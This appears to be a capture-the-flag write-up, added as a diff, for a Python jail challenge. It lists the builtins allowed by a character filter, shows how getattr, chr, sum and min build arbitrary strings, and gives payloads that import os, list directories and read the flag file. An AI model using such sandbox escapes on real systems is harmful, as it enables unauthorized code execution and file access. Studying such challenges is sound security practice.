@@ -1,0 +1,32 @@
+Find available functions
+	ALLOWED_CHARS = "gemhuntersnarecantimer(),/v"
+	[f for f in dir(__builtins__) if all([c in ALLOWED_CHARS for c in f])]
+		['ascii', 'chr', 'enumerate', 'getattr', 'hasattr', 'hash', 'int', 'isinstance', 'iter', 'min', 'range', 'set', 'setattr', 'str', 'sum', 'vars']
+
+Bypass python jail with 
+- getattr
+- str
+- min
+- vars
+- chr
+- sum
+- int
+- hash
+
+int(hash(int)/hash(int))
+	1
+sum
+	get any number
+chr
+	get any character
+getattr(str,min(vars(str)))
+	concat characters
+
+python solve.py
+
+print(__import__("os").listdir())
+	['run', 'var', 'tmp', 'boot', 'etc', 'root', 'bin', 'media', 'opt', 'dev', 'proc', 'home', 'lib64', 'srv', 'usr', 'sbin', 'lib', 'mnt', 'sys', '.dockerenv', 'chall']
+print(__import__("os").listdir("chall"))
+	['text.py', 'flag.txt', 'server.py', '__pycache__']
+print(open("chall/flag.txt").read())
+	X-MAS{70_f1gh7_Kr4mpu5_y0u_f1r57_mu57_br34k_0u7_0f_175_PYTH0N_J41L-017F485A}
